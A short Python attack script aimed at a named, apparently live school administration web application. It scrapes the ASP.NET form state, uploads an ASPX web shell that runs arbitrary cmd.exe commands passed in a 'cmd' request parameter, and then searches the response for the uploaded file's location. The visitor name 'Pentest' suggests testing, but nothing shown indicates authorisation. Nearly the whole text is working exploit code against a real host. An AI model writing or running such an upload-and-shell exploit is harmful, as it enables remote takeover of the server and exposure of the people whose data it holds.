import requests
import re
import html

session = requests.Session()
gatepass_url = "https://econnectapp.jupsoft.com/StudentAdministration/Erp_VisitorGatePassNew.aspx?id=+ub90+AGTvY="

# GET fresh page
r = session.get(gatepass_url)
content = r.text

vs = html.unescape(re.search(r'__VIEWSTATE" value="([^"]+)"', content).group(1))
vsg = html.unescape(re.search(r'__VIEWSTATEGENERATOR" value="([^"]+)"', content).group(1))

shell = '<%@ Page Language="C#" Debug="true" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">void Page_Load(object s2, EventArgs e){if(Request["cmd"]!=null){Process p=new Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}</script>'

doc_field = "ctl00$ContentPlaceHolder1$flupload"

# Upload and capture the response FULLY
r2 = session.post(
    gatepass_url,
    files={doc_field: ("shell.aspx", shell, "application/octet-stream")},
    data={
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vsg,
        "ctl00$ContentPlaceHolder1$btnSave": "Save",
        "ctl00$ContentPlaceHolder1$txtVisitorName": "Pentest",
        "ctl00$ContentPlaceHolder1$txtMobileNo": "9999999999",
        "ctl00$ContentPlaceHolder1$txtDate": "11/07/2026",
    },
    allow_redirects=True
)

# Save the full response to inspect
with open("upload_response.html", "w") as f:
    f.write(r2.text)

# Look for clues in the response
# Search for file paths, URLs, upload dirs, img src that might reveal location
clues = re.findall(r'(?:src|href|action)=["\']([^"\']*shell[^"\']*)["\']', r2.text, re.I)
if clues:
    print(f"[!] Found shell references in response: {clues}")

# Look for any URL containing upload-related words
upload_urls = re.findall(r'(?:src|href|action)=["\']([^"\']*(?:upload|Upload|document|Document|file|File|photo|Photo|Visitor|visitor)[^"\']*)["\']', r2.text, re.I)
if upload_urls:
    print(f"\n[!] Upload-related URLs found: {upload_urls[:20]}")

# Check for image tags that might show the uploaded photo
imgs = re.findall(r'<img[^>]*src=["\']([^"\']+)["\']', r2.text)
print(f"\nAll image sources in response:")
for img in set(imgs):
    print(f"  {img}")

# Also look at what the response contains (first 2000 chars)
print(f"\nResponse snippet:")
print(r2.text[5000:6500])

# Check headers for redirect location
print(f"\nResponse URL: {r2.url}")
print(f"Status code: {r2.status_code}")

